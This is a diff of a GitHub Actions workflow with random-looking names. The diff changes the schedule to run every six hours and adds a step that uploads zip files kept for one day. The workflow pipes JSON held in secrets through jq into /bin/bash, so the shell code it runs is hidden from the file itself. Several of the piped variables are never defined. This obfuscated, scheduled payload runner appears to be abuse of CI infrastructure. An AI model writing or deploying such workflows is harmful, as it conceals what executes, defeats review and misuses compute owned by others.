@@ -1,22 +1,27 @@
 name: rebecca10861
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '21 1/6 * * *'
 
+  schedule:
+    - cron: '14 0,6,12,18 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: rebecca10861
         env:
-          kt95: ${{ secrets.kt95 }}
+          jo5724: ${{ secrets.jo5724 }}
         run: |
-          echo $kt95 | jq -r .ub6554 | /bin/bash
-          echo $j439 | jq -r .r10854 | /bin/bash
-          echo $y4 | jq -r .vraq08241 | /bin/bash
-          echo $kuq015 | jq -r .dnjc0 | /bin/bash
-          echo $m306 | jq -r .avrie52 | /bin/bash
+          printf '%s' "$jo5724" | jq -r .vidy9503 | /bin/bash
+          echo $vphy08 | jq -r .zu0 | /bin/bash
+          echo $r225 | jq -r .liax947 | /bin/bash
+          printf '%s' "$lbzzw55945" | jq -r .bgl04 | /bin/bash
+          echo $ex6084 | jq -r .ynb656 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: RkBQtwpc
+          path: "*.zip"
+          retention-days: 1
